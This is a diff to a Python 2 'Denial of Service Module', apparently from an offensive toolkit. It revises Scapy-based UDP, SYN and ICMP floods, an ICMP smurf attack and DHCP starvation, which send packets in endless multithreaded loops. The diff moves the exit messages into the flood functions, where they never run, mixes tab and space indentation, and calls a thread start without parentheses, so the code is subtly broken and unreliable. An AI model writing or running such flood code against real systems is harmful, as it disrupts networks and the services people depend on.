@@ -29,7 +29,7 @@ class Jam(object):
 
 	name = "Denial of Service Module."
 	desc = "Denial of service attacks here."
-	version = "0.9"
+	version = "1.0"
 	ps = "Need to add POST DoS attack."
 
 	def __init__(self):
@@ -69,14 +69,11 @@ class Jam(object):
 		self.dport = dport
 		try:
 			print "[+] UDP flood denial of service initialized on port: {}.".format(dport)
-			for i in range(0,5):
+			for i in range(0,3):
 				u = threading.Thread(name='udpflood',target=self.udpflood)
 				u.setDaemon(True)
 				u.start()
 			self.udpflood()
-		except KeyboardInterrupt:
-			print "[-] UDP flood denial of service finalized."
-			exit(0)
 		except Exception as e:
 			print "[!] Exception caught: {}".format(e)
 
@@ -86,6 +83,8 @@ class Jam(object):
 			UDP_layer = UDP(sport=1337,dport=self.dport)
 			pkt = IP_layer/UDP_layer
 			send(pkt, loop=1, inter=0.0, verbose=False)
+			print "[-] UDP flood denial of service finalized."
+			exit(0)
 		except Exception as e:
 			print "[!] Error: {}".format(e)
 
@@ -100,9 +99,6 @@ class Jam(object):
 				s.setDaemon(True)
 				s.start()
 			self.synflood()
-		except KeyboardInterrupt:
-			print "[-] SYN flood denial of service finalized."
-			exit(0)
 		except Exception as e:
 			print "[!] Exception caught: {}".format(e)
 
@@ -112,6 +108,8 @@ class Jam(object):
 			TCP_layer = TCP(sport=1337,dport=self.dport)
 			pkt = IP_layer/TCP_layer
 			send(pkt, loop=1, inter=0.0, verbose=False)
+			print "[-] SYN flood denial of service finalized."
+			exit(0)
 		except Exception as e:
 			print "[!] Error: {}".format(e)
 
@@ -126,9 +124,6 @@ class Jam(object):
                                 i.setDaemon(True)
                                 i.start()
                         self.icmpflood()
-                except KeyboardInterrupt:
-                        print "[-] ICMP flood denial of service finalized."
-			exit(0)
                 except Exception as e:
                         print "[!] Exception caught: {}".format(e)
 
@@ -138,6 +133,8 @@ class Jam(object):
 			ICMP_layer = ICMP()
 			pkt = IP_layer/ICMP_layer
 			send(pkt, loop=1, inter=0.0, verbose=False)
+                        print "[-] ICMP flood denial of service finalized."
+			exit(0)
 		except Exception as e:
 			print "[!] Error: {}".format(e)
 
@@ -185,9 +182,6 @@ class Jam(object):
 				i2.setDaemon(True)
 				i2.start
 			self.icmpsmurf()
-		except KeyboardInterrupt:
-			print "[-] ICMP smurf denial of service finalized."
-			exit(0)
 		except:
 			print "[!] Error: check the parameters (target)"
 
@@ -198,6 +192,8 @@ class Jam(object):
 			ICMP_layer = ICMP()
 			pkt = IP_layer/ICMP_layer
 			send(pkt, loop=1, inter=0.0, verbose=False)
+			print "[-] ICMP smurf denial of service finalized."
+			exit(0)
 
 		except Exception as e:
 			print "[!] Error: {}".format(e)
@@ -211,9 +207,6 @@ class Jam(object):
                                 i.setDaemon(True)
                                 i.start()
                         self.dhcpstarvation()
-                except KeyboardInterrupt:
-                        print "[-] DHCP starvation denial of service finalized."
-			exit(0)
                 except Exception as e:
                         print "[!] Exception caught: {}".format(e)
 
@@ -224,5 +217,7 @@ class Jam(object):
 			conf.checkIPaddr = False
 			dhcp_discover =  Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=RandString(12,'0123456789abcdef'))/DHCP(options=[("message-type","discover"),"end"])
 			sendp(dhcp_discover, loop=1, inter=0.0, verbose=False)
+                        print "[-] DHCP starvation denial of service finalized."
+			exit(0)
 		except Exception as e:
 			pass
